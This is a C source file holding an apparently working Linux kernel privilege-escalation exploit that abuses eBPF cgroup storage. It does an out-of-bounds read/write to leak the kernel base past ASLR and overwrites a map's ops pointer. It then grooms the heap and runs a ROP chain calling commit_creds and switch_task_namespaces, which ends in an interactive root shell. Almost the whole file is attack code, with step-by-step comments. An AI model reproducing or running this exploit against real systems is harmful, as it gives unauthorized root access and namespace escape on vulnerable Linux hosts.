#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include "bpf_defs.h"
#include "exploit_configs.h"
#include "kernel_defs.h"

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}


int create_bpf_maps(exploit_context* pCtx)
{
    int ret = -1;
    int prog_array_map = -1;
    int data_array_map = -1;
    int cgroup_map0 = -1;
    int cgroup_map1 = -1;
    int ringbuf_map_fd = -1;
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_PROG_ARRAY,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 0x10,
    };

    prog_array_map = create_map(&map_attrs);
    if( prog_array_map < 0){
        printf("[-] failed to create prog_array_map!\n");
        goto done;
    }

    union bpf_attr map_attrs2 =
    {
        .map_type = BPF_MAP_TYPE_CGROUP_STORAGE,
        .key_size = 8,
        .value_size = 0x3f00,
    };

    cgroup_map0 = create_map(&map_attrs2);
    if( cgroup_map0 < 0){
        printf("[-] failed to create cgroup_map0!\n");
        goto done;
    }

    union bpf_attr map_attrs3 =
    {
        .map_type = BPF_MAP_TYPE_CGROUP_STORAGE,
        .key_size = 8,
        .value_size = 0xf000,
    };

    cgroup_map1 = create_map(&map_attrs3);
    if( cgroup_map1 < 0){
        printf("[-] failed to create cgroup_map1!\n");
        goto done;
    }

    union bpf_attr map_attrs4 =
    {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .key_size = 0,
        .value_size = 0,
        .max_entries = 0x100000,
    };
    ringbuf_map_fd = create_map(&map_attrs4);

    if( ringbuf_map_fd < 0){
        printf("[-] failed to create ringbuf_map_fd!\n");
        goto done;
    }

    union bpf_attr map_attrs5 =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x1000,
        .max_entries = 1,
    };

    data_array_map = create_map(&map_attrs5);
    if( data_array_map < 0){
        printf("[-] failed to create data_array_map!\n");
        goto done;
    }

    pCtx->prog_array_map = prog_array_map;
    pCtx->cgroup_map0 = cgroup_map0;
    pCtx->cgroup_map1 = cgroup_map1;
    pCtx->ringbuf_map_fd = ringbuf_map_fd;
    pCtx->data_array_map = data_array_map;
    ret = 0;
    
done:
    printf("create map success\n");
    return ret;
}

//Here is the prog which will do heap overflow write to the heap which created in  bpf_test_run -> bpf_cgroup_storage_alloc
int load_prog_do_oob_read_write(exploit_context* pCtx){
    int prog_fd0 = -1;
    char verifier_log_buff[0x200000] = {0};
    struct bpf_insn insn0[] =
    {
	BPF_LD_MAP_FD(BPF_REG_1, pCtx->cgroup_map1),
        BPF_MOV64_IMM(BPF_REG_2, 0), //BPF_CGROUP_STORAGE_SHARED
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_get_local_storage),
	//Now we get the heap created in  bpf_test_run -> bpf_cgroup_storage_alloc.
	//We try to do oob read to confirm if the next heap is a 'struct bpf_array' 
	BPF_LDX_MEM(BPF_H, BPF_REG_1, BPF_REG_0, 0x3ff0),//Read 'struct bpf_array . map . ops' low 2 bytes
	BPF_JMP_IMM(BPF_JEQ, BPF_REG_1, ARRAY_MAP_OPS_OFF&0xffff, 2), //Check if the next heap is a 'struct bpf_array'
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

	BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0x3ff0),//Get map -> ops, the address of array_map_ops; Get the offset from debugging
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0x3ff0+0xc0), //Get map ->rcu list. It is a two-way pointer pointing to itself. We will use w;

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x50),//Get bpf_array->value address. We put the map->ops here.
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_2, 0x3ff0), //Overwrite map->ops to bpf_array->value.
        BPF_LD_IMM64(BPF_REG_3, ARRAY_MAP_OPS_OFF),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_1, BPF_REG_3), //calculate off to bypass ASLR
        BPF_LD_IMM64(BPF_REG_3, POP_RBX_RET),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1), //calculate first gadget address

        //Now overwrite map->ops->map_delete_elem
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0x3ff0+0x110+0x70), //0x110 = offset(bpf_array, value), 0x70 = offset(bpf_map_ops, map_delete)
	//Next, we try to store th kernel off at data_array_map
	BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),
	//Get the map_value of data_array_map
	BPF_LD_MAP_FD(BPF_REG_1, pCtx->data_array_map),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
	BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),//Store the kernel off at &data_array_map->value[0]
	BPF_MOV64_IMM(BPF_REG_1, 1),
	BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 8),//Store 1 at &data_array_map->value[8] to mark we have written the map->ops->map_delete_elem
	BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };


    union bpf_attr prog_attrs =
    {
        .prog_type = BPF_PROG_TYPE_CGROUP_SKB,
        .insn_cnt = sizeof(insn0) / sizeof(insn0[0]),
        .insns = (uint64_t)insn0,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (uint64_t)verifier_log_buff
    };
    prog_fd0 = bpf(BPF_PROG_LOAD, &prog_attrs);
    if(0 > prog_fd0)
    {
        puts(verifier_log_buff);
    }

    int ret = update_map_element(pCtx->prog_array_map, 0, &prog_fd0, 0);
    if(ret<0){
        printf("Fail to update map array");
        return;
    }
}


void test_run(int prog_fd){
    int ret = -1;
    char * data_in = malloc(0x100);
    memset(data_in, 0x41, 0x100);
    union bpf_attr attr =
    {
    };
    attr.test.prog_fd = prog_fd;
    attr.test.data_size_in = 0x100;
    attr.test.data_size_out = 0x100;
    attr.test.data_in = data_in;
    attr.test.data_out = data_in;
    ret = bpf(BPF_PROG_TEST_RUN, &attr);
    if(ret < 0){
    	printf("test run fail : %d\n", ret);
    }
}

void go_ropgadget(int fd, uint64_t kernel_off, exploit_context* pCtx){
    struct bpf_insn insn[] =
    {
        //for debug
        BPF_LD_MAP_FD(BPF_REG_1, pCtx->ringbuf_map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x10),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),
        //Pad stack
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa8),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_CRED),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa0),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + COMMIT_CREDS),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x98),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x90),
        BPF_LD_IMM64(BPF_REG_0, 1),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x88),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + FIND_TASK_BY_VPID),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x80),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + MOV_RDI_RAX_POP_RBX_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x78),
        BPF_LD_IMM64(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x70),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RSI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x68),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_NSPROXY),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x60),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + SWITCH_TASK_NAMESPACES),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x58),
        //BPF_LD_IMM64(BPF_REG_0, kernel_off + LEAVE_RET),
        //BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x20),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + SWAGPGS_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x50),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + IRETQ),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x48),
        BPF_LD_IMM64(BPF_REG_0, (uint64_t)shell),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x40),
        BPF_LD_IMM64(BPF_REG_0, user_cs),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x38),
        BPF_LD_IMM64(BPF_REG_0, user_rflags),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x30),
        BPF_LD_IMM64(BPF_REG_0, user_rsp|8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x28),
        BPF_LD_IMM64(BPF_REG_0, user_ss),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x20),
        //Jmp to gadget
        //Now we jmp to map->ops->map_update_elem
        BPF_LD_MAP_FD(BPF_REG_1, fd),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_delete_elem),
        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] failed to run eBPF program!\n");
        exit(0);
    }
}

//Load and run the prog which call tail_call
void load_and_run_prog_do_tail_call(exploit_context* pCtx){
    int prog_fd0 = -1;
    char verifier_log_buff[0x200000] = {0};
    struct bpf_insn insn0[] =
    {
	//For debug
	BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
	BPF_LD_MAP_FD(BPF_REG_1, pCtx->ringbuf_map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x10),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
	//For debug end
	BPF_LD_MAP_FD(BPF_REG_2, pCtx->cgroup_map0), //here will call bpf_cgroup_storage_assign
	BPF_LD_MAP_FD(BPF_REG_2, pCtx->prog_array_map),
	BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_tail_call),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

    };


    union bpf_attr prog_attrs =
    {
        .prog_type = BPF_PROG_TYPE_CGROUP_SKB,
        .insn_cnt = sizeof(insn0) / sizeof(insn0[0]),
        .insns = (uint64_t)insn0,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (uint64_t)verifier_log_buff
    };
    prog_fd0 = bpf(BPF_PROG_LOAD, &prog_attrs);
    if(0 > prog_fd0)
    {
        puts(verifier_log_buff);
    }
    //Before run the prog, do heap fengshui
    //Create many 'struct bpf_array', which will use kmalloc-1k
    int array_map_list[0x100];
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x3e00,
        .max_entries = 1,
    };
    for(int i=0;i<0x100;i++){
	   array_map_list[i] = create_map(&map_attrs);
    }
    //Delete array_map_list[0x80], We hope that 'bpf_test_run->bpf_cgroup_storage_alloc' can get back the released heap memory
    for(int i=0;i<0x100;i++){
    	if(i%2==0)
		close(array_map_list[i]);
    }
    sleep(0.1);
    char *data = malloc(0x1000);
    memset(data, 0, 0x1000);
    while(1){
    	test_run(prog_fd0);
	lookup_map_element(pCtx->data_array_map, 0, data);
	if(*(uint64_t *)(&data[8]) == 1)//It means we do heap fengshui success
		break;
	sleep(0.1);
    }
    uint64_t kernel_off = *(uint64_t *)(&data[0]);
    printf("get kernel_off : %llx\n",kernel_off);
    
    for(int i=0;i<0x100;i++){
    	if(i%2==0)
		continue;
	go_ropgadget(array_map_list[i], kernel_off, pCtx);
    }
    
}



int main(int argc, char **argv)
{
    save_state();
    exploit_context ctx = {0};
    
    if(0 != create_bpf_maps(&ctx))
    {
        printf("[-] failed to create bpf maps!\n");
        goto done;
    }
    
    load_prog_do_oob_read_write(&ctx);
    load_and_run_prog_do_tail_call(&ctx);
done:
    return 0;
}
